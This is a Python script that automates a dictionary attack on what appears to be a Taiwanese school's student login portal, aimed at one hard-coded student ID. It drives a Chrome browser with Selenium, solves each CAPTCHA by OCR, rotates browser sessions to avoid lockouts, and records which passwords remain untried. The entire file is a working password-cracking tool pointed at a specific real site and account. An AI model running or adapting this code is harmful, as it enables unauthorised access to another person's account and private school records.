import time
import ddddocr
import random
import logging
from selenium import webdriver
from selenium.webdriver.common.by import By

def get_code():
    ocr = ddddocr.DdddOcr(show_ad=False)
    with open("./code.png", "rb") as f:
        img_bytes = f.read()
    code = ocr.classification(img_bytes)
    return code


chromium_path = "./chrome-linux/chrome"
target_url = "https://study.tcssh.tw/"
success_url = "https://study.tcssh.tw/main_student.html"
student_id = "011308"

logging.basicConfig(level=logging.INFO)
driver_options = webdriver.ChromeOptions()
driver_options.binary_location = chromium_path

logging.info("Loading password dictionary...")

with open("pwd.txt", "r", encoding="utf-8") as f:
    pwd_list = f.readlines()
    pwd_list = [pwd.strip() for pwd in pwd_list]


logging.info("Testing browser...")
browser = webdriver.Chrome(options=driver_options)


logging.info("Start cracking...")
found = False
try_count = 0

try:
    for _ in pwd_list.copy():

        if try_count % 5 == 0:
            if browser:
                browser.close()
            browser = webdriver.Chrome(options=driver_options)
            browser.get(target_url)
            e = browser.find_element(By.ID, "txt_student_id")
            e.send_keys(student_id)
            try_count = 0
        try_count += 1

        pwd = random.choice(pwd_list)
        logging.info("Trying " + pwd)

        e = browser.find_element(By.ID, "txt_student_pid")
        e.clear()
        e.send_keys(pwd)

        img_tags = browser.find_elements(By.TAG_NAME, "img")
        code_img = img_tags[1]

        while True:
            try:
                code_img.screenshot("./code.png")
                break
            except:
                time.sleep(0.1)
                img_tags = browser.find_elements(By.TAG_NAME, "img")
                code_img = img_tags[1]
                continue
        code = get_code()
        e = browser.find_element(By.ID, "security_code")
        e.clear()
        e.send_keys(code)
        
        e = browser.find_element(By.ID, "but_student_login")
        e.click()

        img_tags = browser.find_elements(By.TAG_NAME, "img")
        while len(img_tags) == 3:
            time.sleep(0.1)
            img_tags = browser.find_elements(By.TAG_NAME, "img")
            continue

        try:
            e = browser.find_element(By.ID, "div_login_message")
        except:
            print("Found password: " + str(pwd).zfill(5))
            found = True
            break
        if e.text == "驗證碼錯誤":
            continue
        else:
            pwd_list.remove(pwd)
finally:
    if len(pwd_list) == 0:
        print("All passwords have been tried. But none of them is correct.")
    elif found:
        with open("pwd.txt", "w", encoding="utf-8") as f:
            f.write(str(pwd).zfill(5) + "\n")
    else:
        with open("pwd.txt", "w", encoding="utf-8") as f:
            for pwd in pwd_list:
                f.write(str(pwd).zfill(5) + "\n")
